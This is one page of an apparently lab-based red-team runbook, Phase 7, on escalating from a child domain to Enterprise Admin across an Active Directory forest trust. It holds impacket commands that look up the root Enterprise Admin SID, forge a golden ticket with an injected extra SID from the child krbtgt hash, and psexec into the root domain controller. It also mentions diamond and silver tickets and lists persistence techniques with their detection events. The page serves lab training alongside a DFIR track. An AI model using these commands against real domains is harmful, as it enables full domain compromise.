# CAMPAIGNS v2 — Phase 7 — Forest Trust Escalation (SID History)

> **Campaign v2** — read the theory here, run each command block live, then update [`CAMPAIGNS-METADATA.md`](../CAMPAIGNS-METADATA.md).
> **Index:** [`CAMPAIGNS-RUNBOOK-README.md`](CAMPAIGNS-RUNBOOK-README.md) · **Full reference:** [`CAMPAIGNS_v2.md`](../CAMPAIGNS_v2.md) · **Topology:** [`CAMPAIGNS.md`](../CAMPAIGNS.md)
> **DFIR track:** [`DFIR-Nexus-Pioneer-workflow.md`](../DFIR-Nexus-Pioneer-workflow.md)
>
> **Sync rule:** When you change this runbook during lab work, apply the same edit to [`CAMPAIGNS_v2.md`](../CAMPAIGNS_v2.md) (matching section). Re-run `python tools/split-campaign-runbooks.py --check` to verify coverage.

**Default host:** Kali / provisioning (`192.168.77.60`) unless a step says otherwise.

---

### Phase 7 — Forest Trust Escalation (SID History — WT010-012)


|                   |                                                   |
| ----------------- | ------------------------------------------------- |
| **Target**        | dc01 (.10) — root domain via parent-child trust   |
| **From**          | Kali                                              |
| **Starting cred** | Child krbtgt + child DA (from Phase 6)            |
| **What you earn** | **Enterprise Admin** in cadre.local → root krbtgt |


The child has a bidirectional transitive trust with the root. Forge a golden ticket with the root's EA SID injected via `-extra-sid`.

```bash
# Get root EA SID
impacket-lookupsid -hashes :<child_admin_nthash> cadre.local/Administrator@192.168.77.10
# Forge ticket with EA SID
impacket-ticketer -nthash <child_krbtgt_hash> -domain child.cadre.local \
  -domain-sid <child_sid> -extra-sid <root_EA_SID> Administrator
# Authenticate to dc01 as EA
impacket-psexec cadre.local/Administrator@192.168.77.10 -k -no-pass
```

**Stealth alternative — Diamond Ticket (WT012):** Modify a legitimate TGT instead of forging one.

**Targeted alternative — Silver Ticket (WT011):** Forge service-specific TGS for targeted access without DC contact.

#### G — Persistence (Inline)


| G WT# | Technique                    | Detection        |
| ----- | ---------------------------- | ---------------- |
| 088   | Scheduled Task (T1053.005)   | WinSec 4698      |
| 089   | Registry Run Key (T1547.001) | Sysmon EID 12-13 |

---

## Navigation

← Previous: [`CAMPAIGNS-RUNBOOK-6.md`](CAMPAIGNS-RUNBOOK-6.md) · Next: [`CAMPAIGNS-RUNBOOK-8.md`](CAMPAIGNS-RUNBOOK-8.md) →
